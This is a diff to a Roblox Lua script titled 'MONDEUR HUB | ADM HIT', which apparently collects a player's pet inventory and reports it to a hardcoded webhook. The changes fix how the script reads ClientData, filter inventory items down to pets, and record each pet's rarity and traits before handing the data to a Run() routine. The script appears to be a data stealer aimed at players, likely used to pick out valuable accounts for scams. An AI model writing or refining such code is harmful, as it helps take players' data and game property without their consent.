@@ -1,7 +1,7 @@
 --// MONDEUR HUB | ADM HIT 🦊 (REAL INVENTORY VERSION)
 
 local HttpService = game:GetService("HttpService")
-local ClientData = require(game:GetService("ReplicatedStorage").ClientModules.Core.ClientData)
+local ClientData = require(game:GetService("ReplicatedStorage"):WaitForChild("ClientModules"):WaitForChild("Core"):WaitForChild("ClientData"))
 
 -- =========================
 -- 🔥 HARDCODED WEBHOOK
@@ -66,41 +66,31 @@ local function getPetEmoji(name, p)
 end
 
 -- =========================
--- 📦 PROCESS PETS (ENHANCED DETECTION)
+-- 📦 PROCESS PETS (FIXED FOR NEW STRUCTURE)
 -- =========================
 local function process(pets)
     local map, total = {}, 0
 
-    -- Debug: Print what we're receiving
-    print("🔍 DEBUG - Pets received:", typeof(pets), #pets or "nil")
+    for _, petData in pairs(pets or {}) do
+        if petData and petData.id then
+            local rawName = tostring(petData.id):gsub("_", " ")
+            local key = normalize(rawName)
 
-    for _, p in pairs(pets or {}) do
-        if p then
-            -- Try multiple possible pet ID locations
-            local petId = p.id or p.name or p.PetId or p.petId or p.Name
-            
-            if petId then
-                local rawName = tostring(petId):gsub("_", " ")
-                local key = normalize(rawName)
-
-                if not map[key] then
-                    map[key] = {
-                        name = rawName:sub(1,1):upper() .. rawName:sub(2),
-                        count = 0,
-                        value = 0,
-                        rarity = (p.rarity or p.Rarity or p.rarity or "common"):lower(),
-                        neon = p.properties and p.properties.neon or p.neon or p.Neon,
-                        mega = p.properties and p.properties.mega or p.mega or p.Mega,
-                        fly = p.properties and p.properties.flyable or p.flyable or p.Flyable or p.fly,
-                        ride = p.properties and p.properties.rideable or p.rideable or p.Rideable or p.ride
-                    }
-                end
-
-                map[key].count += 1
-                total += 10 
-            else
-                print("⚠️ Pet without ID:", p)
+            if not map[key] then
+                map[key] = {
+                    name = rawName:sub(1,1):upper() .. rawName:sub(2),
+                    count = 0,
+                    value = 0,
+                    rarity = (petData.rarity or "common"):lower(),
+                    neon = petData.neon,
+                    mega = petData.mega,
+                    fly = petData.flyable,
+                    ride = petData.rideable
+                }
             end
+
+            map[key].count += 1
+            total += 10 
         end
     end
 
@@ -108,7 +98,6 @@ local function process(pets)
     for _, v in pairs(map) do table.insert(list, v) end
     table.sort(list, function(a,b) return a.count > b.count end)
 
-    print("🔍 DEBUG - Processed pets:", #list)
     return list, total
 end
 
@@ -121,7 +110,7 @@ local function format(list)
         if i > 12 then break end
         table.insert(t, string.format("%s%s x%d", getPetEmoji(p.name:lower(), p), p.name, p.count))
     end
-    return (#t > 0 and table.concat(t,"\n") or "No pets detected")
+    return (#t > 0 and table.concat(t,"\n") or "No pets")
 end
 
 -- =========================
@@ -173,28 +162,21 @@ local function Run(data)
 end
 
 -- =========================
--- 🛠️ FETCH REAL DATA SAFELY (MULTIPLE PATHS)
+-- 🛠️ FETCH REAL PETS FROM INVENTORY
 -- =========================
-local function getPets()
-    local myData = ClientData.get_data()[game.Players.LocalPlayer.UserId]
-    
-    print("🔍 DEBUG - myData:", myData and "exists" or "nil")
-    
-    if myData then
-        print("🔍 DEBUG - myData.inventory:", myData.inventory and "exists" or "nil")
-        print("🔍 DEBUG - myData.inventory.pets:", myData.inventory and myData.inventory.pets and "exists" or "nil")
-    end
-    
-    -- Try multiple possible paths
-    return (myData and myData.inventory and myData.inventory.pets) or
-           (myData and myData.pets) or
-           (myData and myData.Inventory and myData.Inventory.Pets) or
-           {}
-end
+local inventory = ClientData.get("inventory")
+local pets = {}
 
--- Execute
-local pets = getPets()
-print("🔍 FINAL PETS COUNT:", #pets)
+-- Filter ONLY PETS from inventory (not other items)
+for category, items in pairs(inventory or {}) do
+    if category == "pets" or category:lower():find("pet") then
+        for _, petData in pairs(items) do
+            if petData and petData.id then
+                table.insert(pets, petData)
+            end
+        end
+    end
+end
 
 Run({
     player = {
